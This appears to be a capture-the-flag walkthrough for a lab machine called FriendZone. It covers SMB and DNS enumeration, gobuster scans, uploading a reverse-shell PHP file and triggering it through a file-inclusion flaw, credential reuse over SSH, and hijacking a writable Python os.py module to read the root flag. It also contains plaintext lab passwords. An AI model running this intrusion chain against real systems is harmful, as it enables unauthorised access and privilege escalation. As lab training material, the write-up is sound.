FROM SMB :-
smbclient \\\\10.10.10.123\\general
admin:WORKWORKHhallelujah@#

E = haha@friendzone.red
CN = friendzone.red
OU = CODERED
O = CODERED
L = AMMAN
ST = CODERED
C = JO

DNS 53: (see ippsec video for bank machine).
nslookup
> SERVER 10.10.10.123

output:
``` Default server: 10.10.10.123
    Address: 10.10.10.123#53 ```


> friendzone.red

output:
``` Server:10.10.10.123
    Address:10.10.10.123#53
    Name:friendzone.red
    Address: 127.0.0.1
    Name:friendzone.red
    Address: ::1 ```

Interesting try dns zone transfer.

Refer to image.

Actually we have DNS server so add it to /etc/resolv.conf file like this:

nameserver 10.10.10.123

and add friendzone.red in /etc/hosts file

open https://friendzone.red
Check the source code: you will get to know about /js/js directory. so make a request to 
https://friendzone.red/js/js ==> VnRxY09uNFJwUjE1NjAyNDM0MjA3THhNZVpSOTJu (b64) ==> VtqcOn4RpR15602434207LxMeZR92n

Use dirbuster to enumerate 443:
> gobuster -u https://friendzone.red -w /usr/share/wordlists/dirb/common.txt -k

Output:
``` /.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
```

> gobuster -u https://uploads.friendzone.red -w /usr/share/wordlists/dirb/common.txt -k

Output:

```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/files (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
```
> gobuster -u https://administrator1.friendzone.red -w /usr/share/wordlists/dirb/common.txt -k

Output:
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/images (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
```

Upload your reverse shell in smbclient \\\\10.10.10.123\\development here, suppose filename is reverse.php
Go to this url
> https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/reverse

you will get reverse connection as www-data.

Go to /var/www/mysql_data.conf you will get user password.
dbuser = friend
dbpass = Agpyu12!0.213$

use those credentials to take remote using ssh.

Now for root 2 things:
1- pspy (refer to screenshot)
2- Basic Linux enumeration script (for ex. Linux smart enumeration having l1 verbosity).
Interested thing in output is we can write os.py file

so we will add following lines to read root.txt also we can write reverse shell code instead to this:
f = open('/root/root.txt','r')
data = f.read()
f.close()
f = open('/tmp/rootflag.txt','w')
f.write(data)
f.close()

Check temp directory you will get the content.


